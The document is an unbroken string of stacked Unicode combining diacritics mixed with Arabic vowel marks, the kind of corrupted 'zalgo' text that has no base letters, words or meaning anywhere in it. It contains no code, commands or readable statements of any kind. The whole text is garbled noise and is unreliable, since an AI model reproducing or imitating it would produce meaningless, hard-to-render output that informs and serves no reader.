̷̴̶̷̴̸̴̸ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̡̢̨̛̛̙̤̳͖͚̰̳͚̱̙̯̠̖͈̩͎͇̬̹̟̰̩͔̲͍̮̬̱̟̣̻͚͂ͦ̃̌̂ͮ̏̈̽̈́̓͌̾͆̐͌ͤ͌̓̌͂́̿ͫ́̿̈́͌̕̕̕̚͘͘̚͜͠͠͝͞͞͡͞͏̴̴̶̵̶̵̷̵ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّّ̡̢̨̨̡̢͔̲̙͎̠͖͍̰̟̼̺̥̰̻̜̲̣͕͍̜̳̭̮̼̰͓͚̪͕̲̗̰̰̗͚ͣ͑̇̏́̎̽ͭ̓̎ͯͣ̆̈́̂ͦ͂́͑̆͂̀ͨ́ͦ̒́̓̀ͪ͐͛̿̿͂ͬ̌́̇̓ͬͧ̅͂̚̕̕͘͟͢͜͢͟͞͞͠͡͞͡͞͡͠͡ͅͅ͏ًͤ͏̴̸̸ًًٌٌٌٍٍٍََُُُِِِّّّ̢̧̛̤͉̣͚̥̗͍̦̰ͬ̇ͩ̑̔͊̇̀ͨ̕͘͜͜͠͏̷ًًٌٌٍََُُِِّ̲̥͇͓͇̤͑ͤ͐̉ͧͬ̕͜͡͡҉̴ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِّّّّ̨̨̛̙̖͉̫̫̯̬̼̙̽ͩ̓͗̀̇ͫ̓̏͊́͋̇́̔̉̆͘͘͢͜͞͞͞͞͠ͅ҉̸̸̵̷̴ًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̮̼͔̖͚̦̻͖͖͚̥͉̫͓̗͛̅̈ͮͤͯͮ̈̔͘̕͢͟͠͠ͅ҉ًًًٌٌٌٍٍََُُُِِِّّ̧̛̝͔͓̟̗̗͗̌̆̓ͧ͑̐̂͗̕̕̕͟͢͝͏ٍَّ̙̌͏̴̴̵̴̷̴ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̨̨̨̡̛͈̝͔̟̫̣͎̗̫̰̮̳͍̞͍̗̩̥͇̠̾ͩͧ̑ͨ̅ͣ̓̓ͧ̓ͮ́̑͌̌́ͧ̓ͬ͘͘͜͢͢͠ͅ͏̴ًٌٍَُُِّ̪̮̮͙̫ͩ̔ͭͦ́͞͏̶̶̸̶̴̵ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِِّّّّّّّ̧̢̡̢̢̨̡̢̨̛̟͕̘̮̮̭̳͖͚̪̘̼̹̣͕͇̝̪͙̙̝̞̪ͫ̇́ͫ̿ͤ͛͗ͨ̆̃ͭ̍́̀ͤͯ̿ͦ̿̈̿͆́͘͘̚͘͘͜͢͜͠͡ͅͅ͏̸̶̶ًًٌٌٍٍٍَََُُِِّّّ̨̱̤̳̎̍͒ͣͭ̔ͯ̽̊͒́̇͝͞͞͡ͅͅ҉ً҉̵̷̴̴̷̵̷̶̸̷̷̶̷̶̴̶ًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََُُُُُُُُُُُُُُِِِِِِِِِِِِِِّّّّّّّّّّّّّّ̨̧̢̧̨̢̨̢̢̨̨̨̡̢̛̹̝̻͉͙̲͉̥͔̝͖͎̣͔̳̰̖̲̻̹͖̞̱͓̰̥̠̰̗̳̪̦͇̦͕̝̺̝̺̥͔̱͎̣͍̝̻̥̲̞͚̫̠͐̉̊ͩͥ͊́̅ͤ̀ͣ̊̑ͫ̐̇̒́͒̎͗̿̀͆̔ͫ͋ͮ̿͛͆̾͊̏ͤ͆̂̀̾ͯͨ͋͑͑̂ͩ̍ͨ̑̽ͨ̀ͥ̈́͘͘͘͢͜͜͟͢͢͟͢͝͝͠͠͞͞ͅ͏ًٌُ̢͎̂͏̴̴̴̵̷̷̶̸̶ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّ̢̧̧̢̨̧̨̨̨̡̛̛̟͎̥͈͓̻̲̜̩͈͙̯̤̥̖̳̫̗̗͓͔̮̦͙̹̥͍̱̮͖̫̞̘̜̠͎̲͎̯̬͇͔̍͌͆̃̀ͨ̍ͨ͐͗ͣ̽ͩͣͭ̇̀̓͋́̇ͬ̎̋ͪ͊̎́́̓͐̑́̐͒̋́̑ͧ̕͘͘͘̕͢͟͡͞͠͏ًٌٍَُِّ̤̖͋͑̕͢͝͏ًَُّ̙̇́͢͢͏ٌٍَِّ̢̜̜̈́͌͘͝҉̵̵ًًٌٌٍٍَُُِِّ͔̤̻̝̻̭͈̪̪̠ͨͬ̾̀̂ͧ̒͒̃͞͠͏̵̷ًًًٌٌٌٍٍٍََََُُُِِِّّّّ̡̨̲͎̭̝͇̮̪̥̻̯̺͒̏ͬ́ͨ̀̉̾̀ͯ̕̕̚͟͟͜͠͞͠͞ͅ҉̴̵ًًٌٌٍَُُِِّ̨̲͕̘̙͖͊̀̒̚͞҉̸̷ًًًًٌٌٌٍٍٍٍََََُُُِِِّّّّ̢̛̻̤͇̯̭͉̫̜̜͓̰̮̱͎͑ͬ̑͌͋ͫ͌͗ͨ̀ͫ̿̇̅͘͜͜͜͜͏̴̴̸̸̷̵̸̸ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُُِِِِِِّّّّّّ̡̢̛̩͇̻̩̤̥̝̩͚̟̦̝͓͕̼̜̠͛̉ͯͣ̀̋ͭͬ͛̓͆ͩ́̈͑̉̎̒̀̽͊ͭͩ́̕͘͝͞͝͞͡҉̷̶̴ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̛̮̟̤̦̰͎̟͍̮͔̠̫̘̗̿̐́̄ͮ̊ͥ̋͋ͬͬͣ̿͌̊̕̕͢͢͠͝͠҉̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِّّّّ̡̢̧̢̪̤̙͎͍̦̥̖̱̥̣ͪ̐ͤ͒̇͗͊͑ͨͧ̅̕̚̕͜͞͠͝͏ٍِّ̛̟ͩ͏ًًٌٍََُُِّ̧͉͈̳̖̟̠̥ͬ̄́̈́͛̀͌͘͏̵̷̶̷̴̵ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̨̧̧̢̨̡̧̛̖͔̺͚̫̠̪͎̼͚̯̬̤̺̤̻̞̦͈̬̜̞̻̬̪͕̲̙̘͔̳̲̟ͦ͌ͯ́́͌ͣ̑ͨͦ̇ͤͧ͗̆͗ͯͮͪͮ̄͗̏̃ͭ̍ͣ͗̾͂͋ͩ̕̚̕̕̕͘͟͜͢͝͝͡͞ͅ҉̶ًٌٌٍٍَُِِّّ̧̻̜̗̙͍̗͊̏̉͒̄͌͞͝͏̶̷ًًٌٍََُِّ̙̳̳̅́ͩͮ̎͡͝҉̵̶̸̷̴̴̶ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̧̨̢̧̛͍̘͕͓̰͈̦̝̞̻̗̦̝͔̩͇̺͕̃ͮ́̈́̋̾͊̊͒́̀̏̈́̊̍̿̿͛͒͜͜͟͢͡͡҉̵̴ًًًٌٌٌٍٍَََُُُِِِّّّ̧̧̛̯̺͇͙͇̳͖̯̭̲͓ͥ̀̓ͮ̓͂̑ͥ͐ͩ̑͠͠҉̸̶̴ًًًًًٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِّّّّّ̡̧̧̧̛̲̙͓̝͚̫̗̩̞̪̱̜̱̜̟̯͓͂ͫ͊̐̅̎̂̂̾̉̾ͣ̑͛̐̽ͣͦ̀͘̕͘̕̕͜͢͠҉̷ًًٌٌٍٍََُُِِّّ̡̧̛̎̒ͮ̆ͥ̚͞͞͏̷̴̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̧̧̧̨̨̢͈͓̖̥̣͚̹͙̝̠͎̭͈͕͙̟̻̼̳͕̖̤̙̲̈́̒͗͗̈́͒͆̍̃́̀̉͂̊́̈́̃ͩ̀̈́ͦ͘̕̕͜͢͞͝͞͏̸̷̴ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̧̢̨͚͚͖͙͚̗̖̞̘͉̮͎̯̱̙͖̇̒ͯ́ͦ́̽͐͑̔̽̓ͥ̒͒̄ͪ̌̕̚͘͢͜͢͞͝͠͞͝ͅ҉̴̶̷̵ًًًٌٌٌٍٍٍَََُُُِِّّّ̢̡̤̼̦̙̳̭̱̹̙̿̀̀̃̆ͪͦͬ̑͒͟͝҉̸ًًٌٌٍٍٍََُُِِِّّ̧̨̧̛̛̦̙̭̠̱̹̯̻̔̃͑͑ͫ̔ͨ̇͟͢͞҉̵ًًٌٌٍٍََُُِِّّ̜͓̥̱͎̳ͪ́́̀ͩ̀ͫ́̽͟҉̵̵̶̸̷̷ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُُِِِِِّّّّّّ̢̢̧̢̛̙̲͓̘̯̠̬̤̯̠̭̳̪̹͔͈̩̹̮̙͇̇ͤ̋̋ͥ̋͛ͤ̒̀̉̽ͭ͌̋ͯ̄ͭ͋͢͢͜͢͞͞͠҉̸̶̵̷ًًًٌٌٌٍٍٍَََُُِِِّّّ̡̛̛̼̦̳̞͎͐̂̈͊̃ͣ̎͜͢͞͠͏̴ٌُ̻̑҉̵̸ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّّ̨̡̣̭͙̝͔͍̭͎͇͎͓͓̫̯̤̘͈̯̹̥̱͛̓̐̀̓ͣ̐̈́̂̇͆̒ͩͥ̉͌̃̒͑̀̒̊̆͂̕͘͘͢͟͜͜͜͡͠͞͞͠͡͝҉ًًٌٌٍٍََُُِِّّ̧͖̱͍̙̥͍͕̠̺͎̤̒̆ͥͫ̀̒͛ͪ͂́̏̌͟ͅ҉̷ًٌٍَُِّ̧̗̻̺̰̻͂̈̂̔͢͝҉̵ًًٌٍََُِّ̨͖̬̻̱̊̀̀͟͡҉̸̸̵̸̷ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̡̢̛̠̙͎̩̗̪̦͎̠̦̟͕̘̲͍̪͇͈͇̾̋͗̂͆̽́̃̃̈ͥ́ͩ̑̌̈ͧͨ́̋̕̕͘͘͘͜͢͞͠͏̸ًٌٍَُِِّ̢̛̬͎̠̈̀ͭ͐͠͏̸̶ًٌٍٍَُِّّ̱̱̩̣̼͓̦̐̆ͣ̕͟͝͏ًَُ̺̗ͬ͏̴̸̸̴̴̷ًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̢̧̧̡̛̛̜̝̤̻͔͎͔̖͕̗̠̤͓͓͈̱̣͓̝̩͎̫̺̰̘̣͇̄̐ͨ͌̃̇͆̎ͭ̽͌ͤ͗̃̒ͫ̏̒̂͌͋̏́̓̍ͧ̚̕͘̚͢͢͜͢͟͡͞͝͞͞͏̸̶̷̴̷̷̴̷̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِّّّّّّّّّ̧̨̛̫̱͎̭͖̻̝̯͈̖̼̣̼̙͎̬̤͎̖̺͉̯͌̀̑ͩͮ̑̏̈̑ͫ̇̇ͫͧ̀̋ͯͦͧ̄͌ͫ͌̉̑̽͋̄̐͑͘̚͘͘͘͘͢͢͡͠͝͏̴̴̶̶̷̷̴̴ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̢̡̢̡̧̭̙̞̣̠͖͍̰͖͈͍͎̣̪̦ͩ̄̌̔͂͊̈́͋̽̏̿̆͊̈̾̅ͪ̕͘͘͟͟͠͠҉ًٌٌٍٍَُُِِّ̨̟̰̼̳ͧ̈́̀ͯ̇̓̊ͣ̈́̄͢͟͢͏ًًٌٍََُِّّ̪͓̝ͦͬͪ͂̕͞ͅ҉̵̶̴̵̸̸̷̷̶ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِِّّّّّّّ̢̡̧̢̢̧̧̢̺̥̰̱̗̤̩̰͙̗͔̲̘̦͚̦͓̼̞͈̟̤̍́̽ͨ̌̈͛ͥͥ̂ͭͭ͗͌̅͋̀͋ͪͩ̏̾ͭ̍̌͒͋ͩ̍̋ͣ̍̉ͧͭ̕͜͟͟͟͝͠͞͡͞ͅͅͅ҉َّͭ͏̵̴̸̶̶̴̵ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِّّّّّّّ̡̢̡̨̡̜̻̼̺̩͖̠̠̖̺̼̜͎̤͕̩͖̦̫͕͕̬̖͐ͦ̎̍ͤ͋͛̊̆̓̈́̋̋ͩͭͥ̉́̉̓ͤ̅̑̑̉͐̾́̎̃͒͗͘͘͢͟͟͡͝͝҉̴̵ًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̡̢̡̨̡̲͚͖̗̺̺̘̞͕̲̺͎̠ͥ̓ͫ̐́͐́̅ͣͩ̈́ͬ̒̀̈́͢͜͠҉ًٌٍَُِّ͉̬͖́ͩ͝҉̶ًٌٍُِّ̢̗̾̊҉̸̶ًًًٌٌٌٍٍَََُُُِِِّّ̧̡̨̼̥̗̙̼̱͈̻͓ͤͨͩ͆ͯͭͯͩ̀̓ͮ͑͘͜͜͢͟͞ͅ͏ٍ̟̎҉ّ͍҉̷̵ًًًٌٌٌٍٍَََُُُِِّّ̧̧̛̛͉͎̲͔̗͎͉̙̙͔̞̏͗̽́̆͒̚̚͘͡͠҉̷̵̵̴̵ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̢̢̧̡̧̛͍̹͙̘̳̟͉̖̗̭̪͓͖͔͖͕̭͈̹̬͍̦̦͍̥̦̰̪̳͇͍͖̓̀̅ͭ̌ͣ̏́ͬ̋̏̓̎ͤ̀̈́͗ͭ̽ͨͤ̂̉̾́̾̈́̐̆ͨ̏͒̉̍̎̑ͯ̀͘͘̚̚͜͜͜͢͟͜͠͝͡͡͠͡͏ًًٌٌٍٍٍََُُِِِّّّ̡̮̻͖̥̠̙͍̫͕͉̾ͧ͌ͯ̿́ͫ̅̃̓̔͢͢͝͠͏̵ًًًٌٌٌٍٍَََُُُِِّّ̢̳͕̞̜̳̮̺͊ͫ̿̂ͯͤ̽ͧ͘͜͜͞͡͏̷̸ًًٌٍٍََُِِّّ̡̺͕̳̥̻̒ͪ̃̓ͪ̾̊͘͟͢͏̵ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̢̢̢̧̨̛͚̠͍͉̼̗̼̘̥̘̳͚̣̘̠̣̥̺͍̥̥̝̝̦̣̱̬̿̀̋̄͂ͫͨ͆̈́͗̌ͩ̋̓ͤ͗ͮ̔ͦͨ͊̂̄̋̊̋͛͑̾ͫ́ͬ͋̀̇͘͘̕̕̚͟͢͟͟͞͞͠͠͠͠͝͡͞҉ً҉ًًٌٌٍٍََُُِِّّ̻̮̝̬̥̉̃ͬ̃́͠͠҉ٌٍَُِّ̧̰͚̱̫̫̃͝͏̶ًٌُ̣̤̆҉̷ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̧̨̱̥̱͍̪̮̘̣̜̙̖̗͈̪̠̤͑ͬ̓͐ͣ̉ͩͩ͗ͭ̉ͦ̋ͨ̔̾͆̕͘͢͟͜͞͞͝͡͞҉̵̶̷̷̸̶̴̸ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̧̡̡̨̡̡̧̛̛̥͎̘̠̟͇̘͇̝̥͖̤̩̲̼̮̰͕̲͕̲͖̲̰̝̠̥̳̮̋̂̃̈͐͑̑ͬͥ͂̍̈̀ͨͥͭ̽ͤ̃́̄̄̐ͧ̀̽ͮ͊̚̕̕͜͢͝͠͞͡͞͝ͅͅͅ҉̷̴̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̡̨̨̟̥͚̯̜̻͙̰̘ͪ͂̽̐ͨͪ̋ͣͧ̀͗́ͭ͜͢͠҉̶̴̴̴ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̢̧̨̧̡̛̛̛͖͉̲͍̙̭̦̠͓͓̠̬͚̩̫͖̥̣̙͇̩̙̭̩͖͛͋̏̂̅͗͌ͮ̀͛̄̒̒ͭ̋̈́̇ͣͣ͘̕̕͢͢͟͜͞͞͠͡͞͏̸̷̵̷ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِّّّّّ̡̧̡̛̲̠͕̲̰̘̲̥͔̳̟̳̭̲̜̱͋͒̔̐ͨ̿ͫ́̓͆ͧͭ́ͣͭ̊ͣ̄̕͟͟͝͝͡͝҉̴̴ًًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّّ̡̧̡̡̛̱̱͔̯̖̳̘̘̯̹̥̝̝͛ͭ̆̂̀ͨ̄͐ͩ̇͊͌͌ͣ̍ͯ̀͘̕͟͢͜͠͠ͅ҉ًًٌٌٍٍََُُِِّ̙̝̤̘͓̥̳̆͋ͨ̃ͣ̑͘͘͢͝͏̷ًًٌٍََُُِّّ̡̮ͪ̏̓̐̉͟͠͏̵̴̴̵ًًٌٌٌٍٍٍََُُِِِّّّ̢̢̝͓͔̜̭̝͍̞̪̣ͪͪ̅̔̐͌̈́̆ͫ̌̎͠͏̸̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّ̧̧̢̢̘̳̮̙͙̳͚̺̺͖̹̬̘̘̦̖̖̩̟͔͖̰͐ͤ́̔̇̏̅ͤ͆̀̑́͋̈ͦͨ̈́̌ͩͨ̀̈̑͛̄̚̕̕͟͢͜͟͢͞͡͠͡҉̶ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُُِِِِِِّّّّّّ̨̧̛̛̣̥̟̟̩̮̖̘̞̮͔̞͖͕̖̹̯̻̖͂̉͆̓͊̓ͧ́ͫͩ̂́͗͑͐ͧ͌̅̀̔͆̒ͤ̚̕͢͢͡͝͠ͅ҉̶̵̷ًًًٌٌٌٌٍٍٍَََُُُِِِِّّّ̨̧̛̘̭̙̺̥͙̺͎̼̪ͨͫͯ̀ͬ̓ͭ̄ͪͪͬ̚͜͞͠͞҉̶̵̷̴̵ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِّّّّ̡̡̮͕̩̣̬̘̟͉͖̺͓̺̙̼̝̜͉̀̉̄͂̿̒ͫ̉̽ͩ͊͑ͥͩ̽͘̚̚̕͞͠҉ًَُّ̡̤̑̀͏ًٌٍَِّ̛̣̱̮́͆́̔͏̶̶̴̷̷̷̸̴̵ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّ̡̢̧̢̨̧̧̛̛͍͙̬̻̟͙̙̼͓̲̹̭̪̯̱͎͚͇͓̮̼̜̻̱̥̖͈̯̪̹̼̦̺̗̯̭͖̞̭̭͉̃ͧ͋̀̀̀̊͌ͬ̇́̽ͤ͌͌̈́́̊̈́͗̀̋̀ͥ̈̋ͩͧ̍ͧ͋́̍ͫ̋͑̊͘͘̚͟͟͢͢͟͜͝͞͠͠͡ͅͅ҉̵̵̵̴̸ًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََُُُُُُُُُُُُُُِِِِِِِِِِِِِِّّّّّّّّّّّّّ̡̡̢̨͎͕̘̖̞̤͕̳͕͍̟̹̫̦̮̬̱͉͈̖̪̲̠͉̞̫͕̖͕̼̰̰͇͔̙͖͔̟͈͔̞̟͑ͭͫ̏͋̊͑ͥ̍́́ͨ̃̎̋̃ͭͦ̌́͐́̄̊͛̎ͣ̀̊̍̅̄̋̀̏́̓ͬ̉̔̈͑ͦͬ̎̋̐̈̌̂͋͑͘̕̕͘̚̕͘͘̚̕͘̕̚͢͟͟͜͜͟͢͢͢͜͟͝͞͝͞͞͝͞͠ͅͅͅͅ͏̴̷̵̴ًًًٌٌٌٍٍٍَََُُُِِِّّّّ̧̢̢͖̱͍̜̥͓̬̜̞̭̰̮͌̑̈͋ͮͪ͋̒̅̀͊͘͜͠͡͏ًٌَُِ̜̙͇̹̅̊͏̴̷ًٌٍٍَُِّّ̢̫͑̿̈҉ًٌٍَُِ̧̅͘͝͏ًًٌٌٍََُُِّّ̡̡̙̱̤̬̑̓ͦ̆ͧ̕̕͜͝͠͏ًٍَُِّ̡͖̹̜͈̤ͪͬ͡͏ٌٍِ̧̲̩͔ͦ̀̿͏̵ًًٌٍََُُِّّ̧̣͙̙̺͊̋̒́̏̕͢͠҉ًًٌٌٌٍٍٍََُُِِِّّّ̢̡̢̛̛̛̠̦̗̖̠̗̬͚͎̖̐́̊̄͛̈́ͤͫ̓͘͏ًَ̳̣̔҉ًٌٌٍٍَُُِِّّ̡̧̨͇̞͍̙̩̩̇̓̾͛̑̉ͤ̕̕͝͝͏ًٌٍَُِ̠̭̻̽ͨ͘͟͏ًَّ̙ͯ҉̴̴̵̸ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̧̧̨̛̥̺͔͕̪͖̠̜̰̙̩̲̰̬͚̤͎̇ͪ́̈́̈̅̄̾ͯ͋̉̚͘͟͟͜͡͞ͅ͏̷̸ًًٌٌٍٍََُُِِّّ̧̨̨̯͔͚̱͙̬͉̎̊̆̆̀͐͊҉̸ًًًٌٌٍٍَََُُِِّّّ̡̨̛̰̜̗͓̟̣̪̮̓́͆͐̋ͥ̃͐̀̕͞͝҉ًٌٌٍٍَُُِِّّ̢̧̛̪̝̩̥̝ͮ͌̀̀͗̈́̚̕͟͢͞͞͞ͅͅ͏̵ًًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّ̡̡̢̧̡̛̩̭̼͖̺̠͔̜̰̼̖̺̥̮̯͖͓̪̩ͪ̂̏͊ͦͦͨ̏͐̆ͯͬ͜͢͡͡͝҉̸̶ًًٌٌٍٍََُُِِّّ̧̡̝̺̘̱̩̻̑̿͐̋ͬ̀̽ͯ̑̓͜͜͡҉̸ًٌٍَُِّ͙̯̆̾̓͘͞͝ͅ҉̵̶̴ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̧̢̢̢̡̛̛̲̟̫̞͔̗̮̯̦̖̹̠͔͈̳̹̟̼̎͆ͭ̇̃ͩ̀̀̎͐̅ͫ̀̄̏̐́̓ͤ̽̉́́̕͞͞͠͠͝͝҉̶̷̵̸ًًًًٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̡̛̛̩̹̺̲͓͚̟̩̫͍̪̣̝͗̒̎ͤ̆̈́͂ͩͥͬ̇̍̌ͧ͘͘͢͞͡҉̵̶̶̶̶̶̷̸̶̸̸̸̷ًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََََُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّ̨̨̡̡̧̢̧̢̧̡̨̡̛̛̛̛̛̛͈̗̺͙͈͎͕̯̫̖̝͉̗͇̱̖̣͚̥̬͍͎̱̱̺̥̲̣̰̥̰̦̩̤̜̬͚̥̜̝̥̩̱̞̠̗͚̦̱̘̾͊͆̔̌ͧ̀́̉̓ͯ͑̾ͮ̇̊́̃ͨͮ̆ͨ́̌̓͛̃͂̒́͛ͧͭ̂̈́̌̓̀ͬͯ̋ͪ̿̑̀̈́̑̃͑̓́̑́̒́̀̂́͘͘̕͘͘̕̕͟͟͟͝͞͠͠͞͠͠ͅͅ҉ًًٌٍٍََُِِّّ̛͕̣̦̜̮̞̩̑̈́̇̊͌̈͞͡͏̴̶̵ًًٌٌٌٍٍٍََُُُِِِّّ̢̢̡̛̪̻͚͚̥̙̼ͪ͋ͬ́ͦ̎̅͒̃͂́ͤͥ͘͞ͅ҉̷̸̶̶̶̶ًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّّ̧̧̧̢̧͉̘͚̟̻͕͖̤̮̞̼͉͔̀̇̓́̀̓̌̑̓̈́͊͌ͦ͗̂̓̈́ͩ̚ͅͅ҉ًٌُ̖̪͈̍҉̴̷̴̴̷̸̴ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِِّّّّّّّّ̡̢̡̨̜̹͇̗̟̞͕͇̙͈̠̼̖̘͕̙̪͚̰̣̭̣̞̣̦͈̞̫̝ͣͨͩ̀̊ͭ̃̉̿ͧ́̈͗̓ͩͬ͐̐ͦ͊͐̒̈̎̀̕͘͢͝͡͝͠͡ͅ͏̵̴̵ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِّّّّّ̧̧̡̢̘̥̳̘̠̜̱̠̱̥̣̣̹̼̮̥ͤ́̈́̎̓̂̀̒͌̏̀ͦ͆͘͘̕͘͟͠͡͠͠҉̴ًًٌٍَُِّ̡̯̭̘̼̔ͯ͘͝҉̵ًٌٌٍٍَُُِِّ̢̘͈͍͇͍̋̉̀ͭ͐ͭ͘͝͏̶ًًًٌٌٌٍٍَََُُُِِِّّّ̨̨̢̧̳̜̞͚̣͎̖̻̗̣̭͒ͮ̔͑ͧ̀ͮ̃̌͒ͬ͢͠ͅ҉̷̵̶̶̸̷ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّّ̧̢̠̱̜̗̻̗̰̗̖͈̣̩͕̜̤͈̩̗̤͎̹̦̞͍ͫͩ̏ͦͩͪ̾̀ͥ͊ͩ̿͆͒̀ͤ̂̽́́̂̇̓̓ͮ̑̀͑̕͘̚͢͜͟͢͠͝͝͞͡͞͠͠͏̷̴̷ًًٌٌٌٍٍََُُُِِّّ̢̡̧͉͍̼̮̪̦̹̬̤́̿͐̏̆̾̐̑͘͢͝͏̴̶̴̴̸ًًًًٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̧̤͚̟̘̱͙̠̮̮̪͉̻̣̥̟͔͔̐ͨͭͦ̃̍ͤͬ̀̅̒̃̌̄ͧ͢͞͝͝҉ٌِ̽҉̷̸̴ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِّّّّّّ̡̡̢̛̛̻̠͉̤͚͓͚̱̟̤͚̪̦̺͍ͮ̒͑ͪͧͬͥ͐̔̒ͮ̿̓̇̀̑ͮ͑ͮͦ͘͜͢͢͠͞͏̷̶̵̸̵̸ًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّ̡̡̨̡̧̛͚̟͎̞̩̣̥̲̙̤̙̻͓̘̼̹̻͕͎̻̖̿̈́́̈́͊͗͛ͦ̽̅͊̏ͦ̃́̌̀͆̀͗̔͘̕͜͟͠͝͞ͅͅ͏ًًٌٍَُِّ̧̥̣ͭͣ̔́̾͟͝҉̶̵̶ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّّ̡̧̢̢̧̧̧̨̡̧̛͖̻̗͓͕̗̮̯̪̩͕̥̹̪̜͉̦̺̼̺͒̀̐͊ͯ͂͆̐̽̓̓ͤͥ̌̀ͯ͊̈͂̑̔ͧ͘͟͜͠͞͞͡͝͏̸̶̷̴ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̡̢̧̢̛̭̥̟̘̜̹͎̤̝̣̦̘̜̘̯͖ͨ̍̆̓̽͆̏͛̂̋̑͐̍̉̀͗̀̕͢͜͞͠͝͡ͅ҉̴ًًٌٍََُِّ̡̤̘̠̤̮̽̽ͦ̀̑̊͛͞͏̶̷̴ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̧̢̧̨̡̥̩͓͎̖̱̭̻̳̭̜̙̼̲̫̜̳̗̝͓͍͓̜̖̺̪ͤ͌͌̒ͦ͑ͬͮ́̒̍̍̑ͬ̀́̒̇ͯ̾ͨ̆͑ͬͨͨͤͪ͘͘͟͢͞͝͝͞ͅ͏̸̴̵̸̷̷ًًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̧̡̨̛̞̭̞̟̱͕̲̤̙̼̦̹̹̯̟̙͈̰̘̻̻̭̯̲̫͓̆̑̄͋̌̓ͫͧ̅̿́̃ͥ̍ͪ́̎̇̀́ͬ̌ͨ̽̌ͯ́̈̌͌̓͊ͮ͘͘̚͜͝͠͝҉̶ٌٍُِ̟̆̀͐͏̸̷ًَّ͚̼͑ͩ